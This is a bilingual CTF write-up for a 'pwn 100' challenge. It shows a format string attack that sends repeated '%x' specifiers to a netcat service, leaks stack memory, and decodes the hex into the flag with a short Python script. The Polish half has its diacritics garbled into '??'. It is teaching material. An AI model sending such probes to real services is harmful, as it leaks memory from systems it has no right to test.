# My first service I (pwn 100)


###ENG
[PL](#pl-version)

In the task we can connect to a service via netcat:

```
Welcome to my first service
Please input the secret key:
```

If we provide some string, the server sends it back if it is incorrect.
However, apparently server was doing `printf(our_data)` and therefore we could use `string format attack`.
If we provide some magic formatting parameters like `%s` or `%d` the `printf` function will try to access parameters from the stack, which means we can read data from the stack.

So we did:

```
nc6 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 35000
nc6: using stream socket
Welcome to my first service
Please input the secret key: %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
Invalid key: 0 1 0 0 0 a 0 454b4f7b 4c614269 67426566 3072647d 0 25782025 78202578 20257820 25782025 78202578 20257820 25782025 78202578 20257820 25782025 78202578 20257820 25782025 78202578 20257820 25782025 78202578 20257820 25782025 78202578 20257820 25782025 78202578 20257820 25782025 78202578
```

Where `%x` returns hex encoded integers from the stack.
Now we just have to decode the results:
(each pair of digits we treat as hex integer and we convert it to ascii character)

```python
x = '454b4f7b4c614269674265663072647d02578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578'

print("".join([chr(int(c,16)) for c in [x[i]+x[i+1] for i in range(0,len(x)-1,2)]]))
```

Which gives us:

```
'EKO{LaBigBef0rd}\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W'
```

###PL version

W zadaniu dostajemy adres us??ugi do po????czenia si?? za pomoc?? netcata:

```
Welcome to my first service
Please input the secret key:
```

Je??li podamy jaki?? string, serwer odsy??a go z informacj?? ??e jest b????dny.
Niemniej wygl??da??o na to, ??e serwer wykonywa?? `printf(nasze_dane)` a tym samym mogli??my wykorzysta?? `string format attack`.
Je??li podamy pewne specjalne parametry w stringu jak `%s` albo `%d` funkcja `printf` b??dzie pr??bowa??a za??adowa?? tam warto??ci parametr??w ze stosu, co oznacza, ??e mo??emy w ten spos??b czyta?? dane na stosie.

I to w??a??nie zrobili??my:

```
nc6 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 35000
nc6: using stream socket
Welcome to my first service
Please input the secret key: %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
Invalid key: 0 1 0 0 0 a 0 454b4f7b 4c614269 67426566 3072647d 0 25782025 78202578 20257820 25782025 78202578 20257820 25782025 78202578 20257820 25782025 78202578 20257820 25782025 78202578 20257820 25782025 78202578 20257820 25782025 78202578 20257820 25782025 78202578 20257820 25782025 78202578
```

Gdzie `%x` zwraca integera ze stosu w postaci heksadecymalnej.
Teraz zosta??o jedynie zdekodowa?? wynik:
(ka??d?? par?? cyfr traktujemy jako osobn?? liczb?? heksadecymaln?? i zamieniamy na reprezentacje ascii)

```python
x = '454b4f7b4c614269674265663072647d02578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578202578'

print("".join([chr(int(c,16)) for c in [x[i]+x[i+1] for i in range(0,len(x)-1,2)]]))
```

Co daje:

```
'EKO{LaBigBef0rd}\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W\x82\x02W'
```
